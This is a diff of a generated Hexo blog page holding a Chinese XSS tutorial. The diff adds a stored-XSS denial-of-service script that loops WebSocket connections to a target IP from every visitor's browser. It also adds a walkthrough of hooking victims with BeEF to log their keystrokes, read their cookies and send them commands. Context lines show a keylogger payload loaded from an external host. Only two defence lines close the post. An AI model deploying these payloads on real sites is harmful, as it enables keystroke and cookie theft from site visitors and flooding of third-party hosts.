@@ -17,18 +17,23 @@
   
   <title>XSS_1 | Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="漏洞原理&amp;#8195;简单的来说就是web应用对用户的输入过滤不足，导致攻击者插入恶意的脚本代码 攻击流程 分类&amp;#8195;反射型 &amp;#8195;&amp;#8195;这种类型可以说是一次性的，需要用户去点击攻击者篡改后的链接，才会触发 &amp;#8195;存储型 &amp;#8195;&amp;#8195;这种类型的话，恶意代码会被存储的网站数据库中，知道用户去访问就会触发 &amp;#8195;DOM型 &amp;#8195;&amp;#">
+  <meta name="description" content="漏洞原理&amp;#8195;简单的来说就是web应用对用户的输入过滤不足，导致攻击者插入恶意的脚本代码 攻击流程 分类&amp;#8195;反射型 &amp;#8195;&amp;#8195;这种类型可以说是一次性的，需要用户去点击攻击者篡改后的链接，才会触发 &amp;#8195;存储型 &amp;#8195;&amp;#8195;这种类型的话，恶意代码会被存储的网站数据库中，知道用户去访问就会触发 &amp;#8195;DOM型 &amp;#8195;&amp;#8">
 <meta name="keywords" content="xss">
 <meta property="og:type" content="article">
 <meta property="og:title" content="XSS_1">
 <meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;11&#x2F;25&#x2F;XSS_1&#x2F;index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="漏洞原理&amp;#8195;简单的来说就是web应用对用户的输入过滤不足，导致攻击者插入恶意的脚本代码 攻击流程 分类&amp;#8195;反射型 &amp;#8195;&amp;#8195;这种类型可以说是一次性的，需要用户去点击攻击者篡改后的链接，才会触发 &amp;#8195;存储型 &amp;#8195;&amp;#8195;这种类型的话，恶意代码会被存储的网站数据库中，知道用户去访问就会触发 &amp;#8195;DOM型 &amp;#8195;&amp;#">
+<meta property="og:description" content="漏洞原理&amp;#8195;简单的来说就是web应用对用户的输入过滤不足，导致攻击者插入恶意的脚本代码 攻击流程 分类&amp;#8195;反射型 &amp;#8195;&amp;#8195;这种类型可以说是一次性的，需要用户去点击攻击者篡改后的链接，才会触发 &amp;#8195;存储型 &amp;#8195;&amp;#8195;这种类型的话，恶意代码会被存储的网站数据库中，知道用户去访问就会触发 &amp;#8195;DOM型 &amp;#8195;&amp;#8">
 <meta property="og:locale" content="en">
 <meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;xsslc.jpg">
 <meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;keylogger.png">
 <meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;keyloggerphp.png">
-<meta property="og:updated_time" content="2019-12-02T06:05:21.156Z">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;xssbeef.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;xssbeef1.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;xssbeef2.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;xssbeef3.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;xssbeef4.png">
+<meta property="og:updated_time" content="2019-12-03T05:51:13.938Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;xsslc.jpg">
   
@@ -167,7 +172,6 @@
         <div class="content" style="overflow: auto">
             <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="500" height="86" src="//music.163.com/outchain/player?type=2&id=1300527847&auto=0&height=66"></iframe>
 
-
 <h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>&#8195;简单的来说就是web应用对用户的输入过滤不足，导致攻击者插入恶意的脚本代码</p>
 <h2 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h2><p><img src="/images/xsslc.jpg" alt></p>
 <h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><p>&#8195;反射型</p>
@@ -191,8 +195,21 @@
 <p>&#8195;&#8195;在存在漏洞的网站插入payload：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&quot;http://uip/Keylogger.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
 
+<p>&#8195;4.DOS攻击</p>
+<p>&#8195;如果你发现存储型的xss，并把这段恶意代码插入到目标网站，只要有用户访问到这个点，就会主动去请求连接要攻击的ip地址，站小流量小的话没啥危害，要是内种流量很大的网站，对目标ip会有很大的危害。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=&quot;text/javascript”&gt;</span><br><span class="line"></span><br><span class="line">while (true)&#123; </span><br><span class="line"></span><br><span class="line">var ws = new WebSocket(&quot;ws://要攻击的IP地址:端口”);</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
 
-
+<p>&#8195;5.利用beef软件进行攻击</p>
+<p>&#8195;&#8195;首先我们开启beef，第一个标红处的代码需要你把他插入的目标网站，第二段标红处需要你自己访问</p>
+<p><img src="/images/xssbeef.png" alt="xssbeef"></p>
+<p>&#8195;当有人访问了存在xss的页面后，我们的beef就会显示出来</p>
+<p><img src="/images/xssbeef1.png" alt="xssbeef"></p>
+<p>&#8195;这个<code>logs</code>里记录的是用户鼠标键盘的一些操作：</p>
+<p><img src="/images/xssbeef2.png" alt="xssbeef"></p>
+<p>&#8195;这个<code>Current Browser ——&gt; Details</code> 里记录的是对方的操作系统、浏览器版本、cookie等信息</p>
+<p><img src="/images/xssbeef3.png" alt="xssbeef"></p>
+<p>&#8195;这个<code>Current Browser ——&gt; Commands</code>里是可以发送命令给主机，英文看不懂的自行翻译</p>
+<p><img src="/images/xssbeef4.png" alt="xssbeef"></p>
 <h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><p>&#8195;开启HttpOnly</p>
 <p>&#8195;输入过滤 输出编码</p>
 
